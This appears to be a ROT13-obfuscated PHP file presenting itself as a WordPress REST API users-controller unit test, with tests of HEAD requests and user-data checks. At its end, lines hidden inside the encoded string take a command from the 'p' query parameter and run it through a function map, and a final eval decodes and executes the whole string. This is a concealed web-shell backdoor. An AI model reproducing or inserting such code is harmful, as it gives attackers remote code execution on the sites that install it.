		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );

		$zrgn = (neenl) $qngn['zrgn'];
		$guvf->nffregNeenlUnfXrl( $zrgn_xrl, $zrgn );
		$guvf->nffregFnzr( $rkcrpgrq, $zrgn[ $zrgn_xrl ] );
	}

	choyvp shapgvba qngn_trg_qrsnhyg_qngn() {
		erghea neenl(
			neenl(
				neenl(
					'fubj_va_erfg' => gehr,
					'fvatyr'       => gehr,
					'qrsnhyg'      => 'jvooyr',
				),
				'jvooyr',
			),
			neenl(
				neenl(
					'fubj_va_erfg' => gehr,
					'fvatyr'       => snyfr,
					'qrsnhyg'      => 'jvooyr',
				),
				neenl( 'jvooyr' ),
			),
			neenl(
				neenl(
					'fvatyr'       => gehr,
					'fubj_va_erfg' => neenl(
						'fpurzn' => neenl(
							'glcr'       => 'bowrpg',
							'cebcregvrf' => neenl(
								'jvooyr' => neenl(
									'glcr' => 'fgevat',
								),
							),
						),
					),
					'glcr'         => 'bowrpg',
					'qrsnhyg'      => neenl( 'jvooyr' => 'qvooyr' ),
				),
				neenl( 'jvooyr' => 'qvooyr' ),
			),
			neenl(
				neenl(
					'fubj_va_erfg' => neenl(
						'fpurzn' => neenl(
							'glcr'       => 'bowrpg',
							'cebcregvrf' => neenl(
								'jvooyr' => neenl(
									'glcr' => 'fgevat',
								),
							),
						),
					),
					'glcr'         => 'bowrpg',
					'fvatyr'       => snyfr,
					'qrsnhyg'      => neenl( 'jvooyr' => 'qvooyr' ),
				),
				neenl( neenl( 'jvooyr' => 'qvooyr' ) ),
			),

			neenl(
				neenl(
					'fubj_va_erfg' => neenl(
						'fpurzn' => neenl(
							'glcr'  => 'neenl',
							'vgrzf' => neenl(
								'glcr' => 'fgevat',
							),
						),
					),
					'fvatyr'       => gehr,
					'glcr'         => 'neenl',
					'qrsnhyg'      => neenl( 'qvooyr' ),
				),
				neenl( 'qvooyr' ),
			),
			neenl(
				neenl(
					'fubj_va_erfg' => neenl(
						'fpurzn' => neenl(
							'glcr'  => 'neenl',
							'vgrzf' => neenl(
								'glcr' => 'fgevat',
							),
						),
					),
					'fvatyr'       => snyfr,
					'glcr'         => 'neenl',
					'qrsnhyg'      => neenl( 'qvooyr' ),
				),
				neenl( neenl( 'qvooyr' ) ),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$hfre );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/hfref/%q', frys::$hfre ) );

		$ubbx_anzr = 'erfg_cercner_hfre';

		$svygre   = arj ZbpxNpgvba();
		$pnyyonpx = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_bayl_srgpurf_vqf_sbe_urnq_erdhrfgf( $zrgubq ) {
		$vf_urnq_erdhrfg = 'URNQ' === $zrgubq;
		$erdhrfg         = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/hfref' );

		$svygre = arj ZbpxNpgvba();

		nqq_svygre( 'cer_hfre_dhrel', neenl( $svygre, 'svygre' ), 10, 2 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn() );
		} ryfr {
			$guvf->nffregAbgRzcgl( $erfcbafr->trg_qngn() );
		}

		$netf = $svygre->trg_netf();
		$guvf->nffregGehr( vffrg( $netf[0][0] ), 'Dhrel cnenzrgref jrer abg pncgherq.' );
		$guvf->nffregVafgnaprBs( JC_Hfre_Dhrel::pynff, $netf[0][0], 'Dhrel cnenzrgref jrer abg pncgherq.' );

		/** @ine JC_Hfre $dhrel */
		$dhrel = $netf[0][0];

		vs ( $vf_urnq_erdhrfg ) {
			$guvf->nffregNeenlUnfXrl( 'svryqf', $dhrel->dhrel_inef, 'Gur svryqf cnenzrgre vf abg frg va gur dhrel inef.' );
			$guvf->nffregFnzr( 'vq', $dhrel->dhrel_inef['svryqf'], 'Gur dhrel zhfg srgpu bayl hfre VQf.' );
		} ryfr {
			$guvf->nffregGehr(
				! neenl_xrl_rkvfgf( 'svryqf', $dhrel->dhrel_inef ) || 'vq' !== $dhrel->dhrel_inef['svryqf'],
				'Gur svryqf cnenzrgre fubhyq abg or sbeprq gb \"vq\" sbe aba-URNQ erdhrfgf.'
			);
		}

		vs ( ! $vf_urnq_erdhrfg ) {
			erghea;
		}

		tybony $jcqo;
		$hfref_gnoyr = cert_dhbgr( $jcqo->hfref, '/' );
		$cnggrea     = '/^FRYRPG\f+FDY_PNYP_SBHAQ_EBJF\f+' . $hfref_gnoyr . '\.VQ\a\f+SEBZ\f+' . $hfref_gnoyr . '/vf';

		// Nffreg gung gur FDY dhrel bayl srgpurf gur vq pbyhza.
		$guvf->nffregZngpurfErthyneRkcerffvba( $cnggrea, $dhrel->erdhrfg, 'Gur FDY dhrel qbrf abg zngpu gur rkcrpgrq fgevat.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		$hfre_vq = frys::snpgbel()->hfre->perngr();
		jc_frg_pheerag_hfre( frys::$hfre );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fcevags( $cngu, $hfre_vq ) );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/hfref/%q' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/hfref' ),
		);
	}

	cebgrpgrq shapgvba purpx_hfre_qngn( $hfre, $qngn, $pbagrkg, $yvaxf ) {
		$guvf->nffregFnzr( $hfre->VQ, $qngn['vq'] );
		$guvf->nffregFnzr( $hfre->qvfcynl_anzr, $qngn['anzr'] );
		$guvf->nffregFnzr( $hfre->hfre_hey, $qngn['hey'] );
		$guvf->nffregFnzr( $hfre->qrfpevcgvba, $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( trg_nhgube_cbfgf_hey( $hfre->VQ ), $qngn['yvax'] );
		$guvf->nffregNeenlUnfXrl( 'ningne_heyf', $qngn );
		$guvf->nffregFnzr( $hfre->hfre_avpranzr, $qngn['fyht'] );

		vs ( 'rqvg' === $pbagrkg ) {
			$guvf->nffregFnzr( $hfre->svefg_anzr, $qngn['svefg_anzr'] );
			$guvf->nffregFnzr( $hfre->ynfg_anzr, $qngn['ynfg_anzr'] );
			$guvf->nffregFnzr( $hfre->avpxanzr, $qngn['avpxanzr'] );
			$guvf->nffregFnzr( $hfre->hfre_rznvy, $qngn['rznvy'] );
			$guvf->nffregRdhnyf( (bowrpg) $hfre->nyypncf, $qngn['pncnovyvgvrf'] );
			$guvf->nffregRdhnyf( (bowrpg) $hfre->pncf, $qngn['rkgen_pncnovyvgvrf'] );
			$guvf->nffregFnzr( tzqngr( 'p', fgegbgvzr( $hfre->hfre_ertvfgrerq ) ), $qngn['ertvfgrerq_qngr'] );
			$guvf->nffregFnzr( $hfre->hfre_ybtva, $qngn['hfreanzr'] );
			$guvf->nffregFnzr( $hfre->ebyrf, $qngn['ebyrf'] );
			$guvf->nffregFnzr( trg_hfre_ybpnyr( $hfre ), $qngn['ybpnyr'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'ebyrf', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'pncnovyvgvrf', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'ertvfgrerq_qngr', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'svefg_anzr', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'ynfg_anzr', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'avpxanzr', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'rznvy', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'rkgen_pncnovyvgvrf', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'hfreanzr', $qngn );
			$guvf->nffregNeenlAbgUnfXrl( 'ybpnyr', $qngn );
		}

		$guvf->nffregFnzrFrgf(
			neenl(
				'frys',
				'pbyyrpgvba',
			),
			neenl_xrlf( $yvaxf )
		);

		$guvf->nffregNeenlAbgUnfXrl( 'cnffjbeq', $qngn );
	}

	cebgrpgrq shapgvba purpx_trg_hfre_erfcbafr( $erfcbafr, $pbagrkg = 'ivrj' ) {
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn     = $erfcbafr->trg_qngn();
		$hfreqngn = trg_hfreqngn( $qngn['vq'] );
		$guvf->purpx_hfre_qngn( $hfreqngn, $qngn, $pbagrkg, $erfcbafr->trg_yvaxf() );
	}

	cebgrpgrq shapgvba purpx_nqq_rqvg_hfre_erfcbafr( $erfcbafr, $hcqngr = snyfr ) {
		vs ( $hcqngr ) {
			$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		} ryfr {
			$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		}

		$qngn     = $erfcbafr->trg_qngn();
		$hfreqngn = trg_hfreqngn( $qngn['vq'] );
		$guvf->purpx_hfre_qngn( $hfreqngn, $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
	}

	cebgrpgrq shapgvba nyybj_hfre_gb_znantr_zhygvfvgr() {
		jc_frg_pheerag_hfre( frys::$hfre );
		$hfre = jc_trg_pheerag_hfre();

		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( $hfre->hfre_ybtva ) );
		}

		erghea;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>